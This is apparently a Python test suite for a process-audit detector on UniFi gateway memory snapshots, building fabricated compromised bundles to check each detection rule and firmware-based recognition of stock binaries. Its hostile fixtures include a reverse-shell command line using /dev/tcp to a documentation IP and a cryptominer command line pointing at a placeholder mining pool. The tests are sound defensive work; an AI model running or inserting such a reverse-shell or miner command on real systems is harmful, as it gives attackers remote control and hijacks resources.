"""Synthetic-compromise tests for the process audit.

A detector that reports nothing on a healthy bundle is indistinguishable from
one that is simply broken, so each rule is exercised against a fabricated
snapshot containing the thing it is supposed to catch. The fixtures below are
inert descriptions of processes in the smemcap format - no actual payload.

Run: .venv/bin/python -m pytest tests/ -q   (or: .venv/bin/python tests/test_procaudit.py)
"""
import io
import os
import sys
import tarfile
import tempfile
from pathlib import Path

import zstandard

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from analyzer import procaudit  # noqa: E402

# /proc/<pid>/stat field positions after the closing paren of comm
IDX = {"ppid": 1, "utime": 11, "stime": 12, "threads": 17, "starttime": 19, "rss": 21}


def make_stat(pid, comm, ppid=1, utime=10, stime=5, threads=1, starttime=1000, rss=500):
    fields = ["0"] * 30
    fields[0] = "S"
    fields[IDX["ppid"]] = str(ppid)
    fields[IDX["utime"]] = str(utime)
    fields[IDX["stime"]] = str(stime)
    fields[IDX["threads"]] = str(threads)
    fields[IDX["starttime"]] = str(starttime)
    fields[IDX["rss"]] = str(rss)
    return f"{pid} ({comm}) " + " ".join(fields) + "\n"


def make_smaps(exe=None, libs=()):
    out = []
    if exe:
        out.append(f"55897c9000-5594f68000 r-xp 00000000 07:00 17364    {exe}")
        out.append("Rss:                 100 kB")
    for i, lib in enumerate(libs):
        out.append(f"7f{i:06x}000-7f{i:06x}fff r--p 00000000 07:00 {2000 + i}    {lib}")
        out.append("Rss:                  10 kB")
    return "\n".join(out) + "\n"


def write_snapshot(dirpath: Path, stamp: str, procs):
    """procs: list of dicts with pid, comm, and optional ppid/cmdline/exe/libs."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        def add(name, data: bytes):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))

        add("meminfo", b"MemTotal:        4040828 kB\nMemAvailable:    1800000 kB\n")
        for p in procs:
            pid = str(p["pid"])
            add(f"{pid}/stat", make_stat(
                pid, p["comm"], p.get("ppid", 1), p.get("utime", 10),
                p.get("stime", 5), p.get("threads", 1)).encode())
            add(f"{pid}/cmdline", p.get("cmdline", "").replace(" ", "\x00").encode())
            if p.get("exe") or p.get("libs"):
                add(f"{pid}/smaps",
                    make_smaps(p.get("exe"), p.get("libs", ())).encode())
    raw = zstandard.ZstdCompressor().compress(buf.getvalue())
    (dirpath / f"smemcap_{stamp}_regular.zst").write_bytes(raw)


# A plausible slice of the real stack, so "unrecognized" means something.
BASELINE = [
    {"pid": 1, "comm": "systemd", "ppid": 0, "exe": "/lib/systemd/systemd",
     "cmdline": "/lib/systemd/systemd"},
    {"pid": 2, "comm": "kthreadd", "ppid": 0},
    {"pid": 30, "comm": "kworker/0:1", "ppid": 2},
    {"pid": 100, "comm": "unifi", "exe": "/usr/lib/unifi/lib/unifi",
     "cmdline": "/usr/lib/unifi/lib/unifi -Dunifi.core.enabled=true"},
    {"pid": 101, "comm": "dnsmasq", "exe": "/usr/sbin/dnsmasq",
     "cmdline": "/usr/sbin/dnsmasq -C /run/dnsmasq.conf"},
    {"pid": 102, "comm": "mem_snapshot", "exe": "/bin/bash",
     "cmdline": "/bin/bash /etc/cron.hourly/mem_snapshot"},
]

HOSTILE = [
    # 1. miner executing from writable storage, with a mining pool cmdline
    {"pid": 900, "comm": "kdevtmpfsi", "exe": "/tmp/kdevtmpfsi",
     "cmdline": "/tmp/kdevtmpfsi -o stratum+tcp://pool.example:3333 --donate-level 1",
     "utime": 300000, "stime": 4000, "threads": 4},
    # 2. binary unlinked from disk while still running
    {"pid": 901, "comm": "sshd", "exe": "/usr/sbin/sshd (deleted)",
     "cmdline": "/usr/sbin/sshd -D"},
    # 3. userspace process imitating a kernel worker
    {"pid": 902, "comm": "kworker/2:0", "ppid": 1, "exe": "/var/tmp/.x/kworker",
     "cmdline": "[kworker/2:0]"},
    # 4. reverse shell
    {"pid": 903, "comm": "bash", "exe": "/bin/bash",
     "cmdline": "bash -c bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"},
    # 5. library injection from temporary storage
    {"pid": 904, "comm": "nginx", "exe": "/usr/sbin/nginx", "cmdline": "nginx: worker",
     "libs": ["/lib/aarch64-linux-gnu/libc-2.31.so", "/dev/shm/.hide/libpreload.so"]},
    # 6. resident process with neither mappings nor a command line
    {"pid": 905, "comm": "systemd-worker", "ppid": 1},
]


def build_bundle(tmp: Path, hostile=True, snapshots=6):
    snapdir = tmp / "system/var/log/mem_snapshot"
    snapdir.mkdir(parents=True)
    procs = BASELINE + (HOSTILE if hostile else [])
    for i in range(snapshots):
        write_snapshot(snapdir, f"20260824_{8 + i:02d}1701", procs)
    return tmp


def flags_for(result, comm):
    for e in result["flagged"]:
        if e["comm"] == comm:
            return {f["title"] for f in e["flags"]}
    return set()


def has(titles, *words):
    return any(all(w in t.lower() for w in words) for t in titles)


def main():
    failures = []

    def check(name, cond):
        print(f"  {'PASS' if cond else 'FAIL'}  {name}")
        if not cond:
            failures.append(name)

    with tempfile.TemporaryDirectory() as td:
        clean = build_bundle(Path(td) / "clean", hostile=False)
        res = procaudit.audit_processes(clean)
        print("\nHealthy bundle (expect no flags):")
        check("clean bundle produces no flagged processes", not res["flagged"])
        check("kernel threads identified", res["kernel_threads"] >= 2)
        check("stock processes recognized", res["unrecognized"] == 0)

    with tempfile.TemporaryDirectory() as td:
        eff = build_bundle(Path(td) / "hostile", hostile=True)
        res = procaudit.audit_processes(eff)
        print("\nCompromised bundle (expect every rule to fire):")

        check("miner: flagged as executing from writable storage",
              has(flags_for(res, "kdevtmpfsi"), "writable storage"))
        check("miner: cmdline matched a known malware/mining signature",
              has(flags_for(res, "kdevtmpfsi"), "cryptominer") or
              has(flags_for(res, "kdevtmpfsi"), "mining pool"))
        check("deleted binary flagged",
              has(flags_for(res, "sshd"), "deleted"))
        check("kernel-thread masquerade flagged",
              has(flags_for(res, "kworker/2:0"), "kernel-thread name"))
        check("miner borrowing a kernel-thread name also caught by that rule",
              has(flags_for(res, "kdevtmpfsi"), "kernel-thread name"))
        check("reverse shell cmdline flagged",
              has(flags_for(res, "bash"), "shell network redirection") or
              has(flags_for(res, "bash"), "reverse"))
        check("library injection from temporary storage flagged",
              has(flags_for(res, "nginx"), "temporary storage"))
        check("mapping-less resident process flagged",
              has(flags_for(res, "systemd-worker"), "no executable mapping"))

        print("\nNo collateral damage on legitimate processes:")
        for good in ("unifi", "dnsmasq", "systemd", "kworker/0:1"):
            check(f"{good} not flagged", not flags_for(res, good))
        check("cron-invoked stock script not flagged as editing cron",
              not flags_for(res, "mem_snapshot"))

    # Whether a binary is stock is now read out of the firmware images rather
    # than guessed from its name. A Dream Router owner saw unifi-directory
    # flagged major and udr-ui minor, both perfectly ordinary; the images say
    # so, so they are recognised on any model.
    def bundle_with(procs, version=None):
        """A snapshot bundle, optionally reporting a firmware version."""
        td = tempfile.mkdtemp()
        snapdir = Path(td) / "system/var/log/mem_snapshot"
        snapdir.mkdir(parents=True)
        for i in range(6):
            write_snapshot(snapdir, f"20260824_{8 + i:02d}1701", BASELINE + procs)
        if version:
            (Path(td) / "system").mkdir(parents=True, exist_ok=True)
            (Path(td) / "system/system-version").write_text(version,
                                                            encoding="utf-8")
        return Path(td)

    print("\nWhat the firmware ships is recognised, whatever the model:")
    res = procaudit.audit_processes(bundle_with([
        {"pid": 950, "comm": "unifi-directory", "ppid": 1,
         "exe": "/usr/sbin/unifi-directory-app", "cmdline": "unifi-directory"},
        {"pid": 951, "comm": "udr-ui", "ppid": 1,
         "exe": "/usr/bin/udr-ui", "cmdline": "udr-ui"},
    ]))
    for name in ("unifi-directory", "udr-ui"):
        check(f"{name} is not flagged", not flags_for(res, name))

    # The case the old rule got wrong. A name-prefix allowlist waved anything
    # called unifi-* or ucg-* through as long as it sat in a system directory;
    # neither of these ships in any image, and the firmware says so.
    print("\nA vendor-shaped name that ships nowhere is not excused:")
    res = procaudit.audit_processes(bundle_with([
        {"pid": 952, "comm": "uxg-manager", "ppid": 1,
         "exe": "/usr/bin/uxg-manager", "cmdline": "uxg-manager"},
        {"pid": 953, "comm": "ucg-dash2", "ppid": 1,
         "exe": "/usr/bin/ucg-dash2", "cmdline": "ucg-dash2 --serve"},
    ]))
    for name in ("uxg-manager", "ucg-dash2"):
        check(f"{name} in /usr/bin is flagged",
              has(flags_for(res, name), "firmware"))

    print("\nAnd wherever else it runs from:")
    res = procaudit.audit_processes(bundle_with([
        {"pid": 960, "comm": "unifi-helper", "ppid": 1,
         "exe": "/tmp/unifi-helper", "cmdline": "unifi-helper"},
        {"pid": 961, "comm": "ubnt-agent", "ppid": 1},
        {"pid": 980, "comm": "unifi-daemon", "ppid": 1,
         "exe": "/opt/unifi-daemon/bin/unifi-daemon", "cmdline": "unifi-daemon"},
        {"pid": 981, "comm": "ucg-dash2", "ppid": 1,
         "exe": "/usr/share/ucg-dash2/ucg-dash2", "cmdline": "ucg-dash2"},
    ]))
    check("a UniFi-looking name in /tmp is still flagged critical",
          has(flags_for(res, "unifi-helper"), "writable storage"))
    check("a UniFi-looking name with no executable is still flagged",
          bool(flags_for(res, "ubnt-agent")))
    for name, where in (("unifi-daemon", "/opt"), ("ucg-dash2", "/usr/share")):
        check(f"{name} under {where} is still flagged",
              has(flags_for(res, name), "firmware"))

    # Which image the comparison used is part of the finding, because "not in
    # the firmware" means much less when the firmware on record is not the one
    # the device is running.
    print("\nThe device's own model is used when the bundle names it:")
    res = procaudit.audit_processes(bundle_with(
        [{"pid": 970, "comm": "ucg-dash2", "ppid": 1,
          "exe": "/usr/bin/ucg-dash2", "cmdline": "ucg-dash2"}],
        version="UDMPRO.al324.v5.1.31.5acc35d.260819.1714"))
    fw = res.get("firmware") or {}
    check("the model is resolved from system-version", fw.get("model") == "UDMPRO")
    check("and recognised as one we have", fw.get("known_model") is True)
    check("the version is noted as an exact match", fw.get("exact_version") is True)
    check("an add-on is still flagged against it",
          has(flags_for(res, "ucg-dash2"), "firmware"))

    print("\nAn unrecognised model falls back, and says so:")
    res = procaudit.audit_processes(bundle_with(
        [{"pid": 971, "comm": "ucg-dash2", "ppid": 1,
          "exe": "/usr/bin/ucg-dash2", "cmdline": "ucg-dash2"}],
        version="NOSUCHMODEL.xx.v9.9.9.abc.111111.0000"))
    fw = res.get("firmware") or {}
    check("the model is not claimed to be known", fw.get("known_model") is False)
    check("but the comparison still happens", fw.get("names", 0) > 1000)
    check("and an add-on is still flagged",
          has(flags_for(res, "ucg-dash2"), "firmware"))

    # sshd ships on all fifteen gateways, so calling it unrecognised was never
    # right - but an appliance answering SSH is still worth a sentence.
    print("\nA stock service that is nonetheless worth knowing about:")
    res = procaudit.audit_processes(bundle_with([
        {"pid": 990, "comm": "sshd", "ppid": 1, "exe": "/usr/sbin/sshd",
         "cmdline": "/usr/sbin/sshd -D"},
    ]))
    check("sshd is not called unrecognised",
          not has(flags_for(res, "sshd"), "firmware"))
    check("but its being on is reported", has(flags_for(res, "sshd"), "ssh"))

    print()
    if failures:
        print(f"{len(failures)} check(s) FAILED: {failures}")
        return 1
    print("All checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
